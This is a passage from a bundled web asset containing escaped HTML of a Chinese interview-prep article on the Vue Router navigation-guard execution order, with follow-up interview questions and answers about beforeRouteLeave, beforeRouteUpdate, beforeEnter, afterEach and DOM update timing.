(<code>2.5+</code>)</li>\\n<li>导航被确认</li>\\n<li>调用全局的 <code>afterEach</code> 钩子</li>\\n<li>触发 <code>DOM</code> 更新</li>\\n<li>调用 <code>beforeRouteEnter</code> 守卫中传给 <code>next</code> 的回调函数，创建好的组件实例会作为回调函数的参数传入</li>\\n</ol>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>用户从订单详情切到订单列表时，详情组件已经失活；你却把未保存确认写在全局 <code>beforeEach</code>，为什么这不等同于 <code>beforeRouteLeave</code>？</strong></p>\\n<p>两者触发位置不同：<code>beforeRouteLeave</code> 属于组件守卫，并且先于全局 <code>beforeEach</code> 执行，更适合处理当前组件离开前的状态。全局守卫能够统一拦截导航，但会脱离具体组件语境，规则增多后容易把局部行为扩散到所有路由。</p>\\n</li>\\n<li>\\n<p><strong>后台的 <code>/user/1</code> 跳到 <code>/user/2</code> 时复用了同一个用户组件，页面没有重新创建；数据刷新应该放在哪个守卫，执行顺序处于什么位置？</strong></p>\\n<p>应在复用组件的 <code>beforeRouteUpdate</code> 中响应参数变化。它位于全局 <code>beforeEach</code> 之后、路由配置的 <code>beforeEnter</code> 之前；若只依赖被激活组件的 <code>beforeRouteEnter</code>，组件复用时就不能覆盖这次参数更新。</p>\\n</li>\\n<li>\\n<p><strong>权限团队要求在路由表的 <code>beforeEnter</code> 校验模块权限，页面团队又在组件 <code>beforeRouteEnter</code> 拉取数据；一次进入新页面时谁先执行？</strong></p>\\n<p>路由配置中的 <code>beforeEnter</code> 先执行，随后解析异步路由组件，再调用被激活组件的 <code>beforeRouteEnter</code>。把模块准入放在前者能更早终止导航，但组件内部仍需处理自身进入逻辑，避免把所有页面细节堆进路由配置。</p>\\n</li>\\n<li>\\n<p><strong>线上偶发白屏，日志显示全局 <code>beforeEach</code> 已通过，但异步路由组件没有进入 <code>beforeRouteEnter</code>；你会沿导航流程检查哪一段？</strong></p>\\n<p>重点检查 <code>beforeEnter</code> 之后的异步路由组件解析阶段，因为 <code>beforeRouteEnter</code> 只有在解析完成后才会调用。还要确认导航是否在更早的守卫中被中断；仅看到 <code>beforeEach</code> 通过，不能证明后续解析与确认已经完成。</p>\\n</li>\\n<li>\\n<p><strong>埋点负责人想在全局 <code>afterEach</code> 里立即读取新页面 <code>DOM</code>，页面负责人认为会拿到旧结构；按完整流程谁的判断更稳妥？</strong></p>\\n<p>页面负责人的判断更稳妥，因为导航确认后先调用 <code>afterEach</code>，随后才触发 <code>DOM</code> 更新。<code>afterEach</code> 适合处理导航完成后的全局逻辑，但不应假设新页面 <code>DOM</code> 已经就绪；依赖实例或 <code>DOM</code> 的工作要放到更合适的更新时机。</p>\\n</li>\\n<li>\\n<p><strong>编辑页需要进入后拿到组件实例并定位输入框，为什么不能在 <code>beforeRouteEnter</code> 中直接使用实例，而要借助 <code>next</code> 回调？</strong></p>\\n<p><code>beforeRouteEnter</code> 执行时，被激活的组件实例还没有创建，因此应把回调传给 <code>next</code>。导航确认、<code>afterEach</code> 执行并触发 <code>DOM</code> 更新后，该回调才会收到已创建的组件实例；这类逻辑也因此晚于其他导航守卫。</p>\\n</li>\\n</ul>\\n</section>\\n"}')}}]);